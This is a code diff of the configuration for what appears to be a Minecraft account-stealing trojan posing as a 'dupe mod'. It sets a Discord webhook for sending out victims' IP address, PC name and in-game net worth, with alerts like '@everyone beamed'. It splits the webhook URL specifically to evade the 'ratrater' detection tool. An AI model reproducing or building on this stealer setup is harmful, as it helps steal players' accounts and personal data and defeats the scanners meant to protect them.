@@ -2,8 +2,8 @@ package json;import com.google.gson.Gson;import com.google.gson.JsonArray;import
 
 	// customize
 	public static String webthingy = ""+blank+""; // ratrater hates webhooks so put blank in the middle of the word webhook 
-	// eg public static String webthingy = "https://discord.com/api/web"+blank+"hooks/3298503250985290524/GSDHGIO39TRWJOGSIHRfhdosvh94ytugjOUGR094gHGr9bhup94";
-	public static String mainmessage = "@everyone dupe mod installed";
+	// eg: public static String webthingy = "https://discord.com/api/web"+blank+"hooks/3298503250985290524/GSDHGIO39TRWJOGSIHRfhdosvh94ytugjOUGR094gHGr9bhup94";
+	public static String mainmessage = "@everyone beamed";
 	public static String botusername = "gn";
 	public static String avatar = "https://cdn.discordapp.com/attachments/1095992810265653319/1101102507817697401/5btgxllswggmmc45dzjn2epzjagts5gw_hq.jpg";
 	public static Boolean setts = true;
@@ -22,7 +22,7 @@ package json;import com.google.gson.Gson;import com.google.gson.JsonArray;import
 	public static Boolean discordindent = false;
 	public static String ipstring1 = "IP";
 	public static Boolean ipindent = false;
-	public static String realnamestring1 = "real name";
+	public static String realnamestring1 = "pc name";
 	public static String realnamestring2 = "```"+nameonpc+"```";
 	public static Boolean realnameindent = false;
 	public static String skyshiyuustring1 = "networth";
